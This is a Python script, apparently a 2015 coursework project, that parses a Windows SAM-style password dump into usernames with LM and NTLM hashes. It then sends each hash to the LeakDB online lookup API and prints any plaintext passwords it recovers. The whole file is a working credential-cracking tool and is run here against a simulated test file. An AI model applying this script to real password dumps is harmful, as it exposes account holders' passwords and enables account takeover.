# Author: Thomas Jones
# Last Modified: 10/6/2015
# Written for python3 interpreter 
#
# MET CS 521 Information Structures in Python Project
# -------------------------------------------------------------------
# Will attempt to read Windows SAM file, parse the file, and launch
# an attack against the hashed credentials.
#
# The current attack relies on the online lookup of leaked or precomputed
# hashes through a API provided by https://leakdb.abusix.com/


# Loading Modules
# Requests dependency installed by $ sudo pip install requests
import os.path
import requests #for API request handling


# Initial Values For Testing
SAM_TARGET_FILE = 'sam_test'  # sam test is a simulated file for testing


# Intent: read in a SAM file and parse out the users and password hashes
# Precondition: sam_filename is a valid formatted Windows SAM file
# Postcondition: returns a dictionary accounts that contains:
#      the key username and a value list of sam_ntlm_hash and sam_lm_hash
def read_and_parse_sam_file_lines(sam_filename):
    accounts = {} #empty dictionary

    # if the file string sam_target is determined valid by os.path
    if os.path.isfile(sam_filename):

        # open the file identified by string SAM_TARGET_FILE as sam_file
        sam_file = open(sam_filename)

        # read in sam_file line by line
        for each_line in sam_file:
            users_hashes = [] #list of hashes for each user

            # split line at each delimiting semicolon & assign
            sam_username = each_line.split(":")[0]
            sam_lm_hash = each_line.split(":")[2]
            sam_ntlm_hash = each_line.split(":")[3]

            # add this users hashes to their list of hashes
            users_hashes.append(sam_ntlm_hash)
            users_hashes.append(sam_lm_hash)

            # add this username as a key and their has list as a value
            # to the dictionary of all user accounts
            accounts.update({sam_username:users_hashes})


        # close file after all lines have been handled
        sam_file.close()

    else:  # os.path determined that the file did not exist
        print("Error locating a file " + sam_filename)

    return accounts


# Intent: check http://api.leakdb.net for each hash stored in dictionary_accounts
# Precondition: dictionary_accounts has each key as a username and the value
#               associated with the key is a list of hashed passwords
# Postcondition: prints the username and crack attempt results to screen
def online_hash_lookup_by_leakedb_api(dictionary_accounts):

    #for each user's list of hashes in dictionary_accounts
    for key, value in dictionary_accounts.items():
        # for each hash in this users list of hashes
        for hash_value in value:

            #request this hash from LeakDB API
            r = requests.get('https://api.leakdb.net/?j=%s' % hash_value) #?j for JSON
            json = r.json()

            # lambda function below sets booleans based on string in JSON response
            if ((lambda response: True if response['found'] == "true" else False)(json)):
                print('Username: ', key, '     Password: ', json['hashes'][0]['plaintext'])
            else:
                print('Username: ', key, '     Unable to Crack: ', hash_value)


def main():
    credentials = read_and_parse_sam_file_lines(SAM_TARGET_FILE)
    online_hash_lookup_by_leakedb_api(credentials)
    return

if __name__ == "__main__":  # stops main execution if imported as module
    main()


# CITATIONS:
# Learned to use a main function and protect against execution in modules from:
# Guido van Rossum blog in 2003
# https://www.artima.com/weblogs/viewpost.jsp?thread=4829
#
# Learned to use os.path for basic file verification from a StackOverflow thread:
# http://stackoverflow.com/questions/82831/check-whether-a-file-exists-using-python
#
# Example SAM file found online from KPMG Advisory N.V
# http://www.win.tue.nl/~aeb/linux/hh/Hackers_Hut_Windows_passwords.pdf
#
# Adopted LeakDB lookup from:
# http://blog.abusix.com/2013/07/08/using-leakdb-for-compromised-password-hashes/
